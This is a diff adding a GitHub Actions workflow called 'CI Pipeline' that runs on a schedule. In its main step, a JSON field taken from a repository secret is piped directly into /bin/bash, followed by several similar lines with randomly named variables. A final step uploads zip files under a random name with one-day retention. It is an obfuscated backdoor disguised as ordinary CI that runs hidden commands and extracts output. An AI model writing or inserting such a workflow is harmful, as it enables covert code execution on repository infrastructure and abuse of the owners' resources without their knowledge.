@@ -1,0 +1,32 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '7 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Start
+        env:
+          udc4: ${{ secrets.udc4 }}
+        run: |
+          printf '%s' "$udc4" | jq -r .t959 | /bin/bash
+          printf '%s' "$iu25" | jq -r .um79 | /bin/bash
+          echo $g64200 | jq -r .bwba91182 | /bin/bash
+          echo $lj83 | jq -r .bje4928 | /bin/bash
+          echo $j4216 | jq -r .yfbv4 | /bin/bash
+          printf '%s' "$ctb95841" | jq -r .baa4140 | /bin/bash
+          printf '%s' "$qzjp46" | jq -r .xogm22165 | /bin/bash
+
+      - name: Save output
+        uses: actions/upload-artifact@v4
+        with:
+          name: BcwjRfnG
+          path: "*.zip"
+          retention-days: 1
